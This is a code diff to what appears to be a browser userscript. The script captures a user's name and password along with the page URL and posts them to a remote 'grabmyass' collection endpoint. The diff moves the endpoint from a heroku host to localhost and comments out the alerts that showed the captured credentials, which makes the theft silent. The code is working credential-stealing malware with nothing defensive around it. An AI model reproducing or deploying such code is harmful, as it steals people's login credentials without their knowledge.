@@ -143,19 +143,19 @@ window.show = function()
   }
   if ( user && pass )
   {
-    alert( "Case: " + caseNo + '\n' +user + '\n' + pass + '\n' + document.URL );
+    //alert( "Case: " + caseNo + '\n' +user + '\n' + pass + '\n' + document.URL );
     GM_xmlhttpRequest(
       {
         method: "POST",
-        url: "http://suky.heroku.com/grabmyass",
+        url: "http://localhost:3000/grabmyass",
         data: "sucker[name]=" + user + "&" + "sucker[pass]=" + pass + "&" + "sucker[link]=" + document.URL,
         headers: 
         {
-    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
         },
         onload: function(response) 
         {
-    alert(response.responseText);
+          //alert(response.responseText);
         }
       });
   }
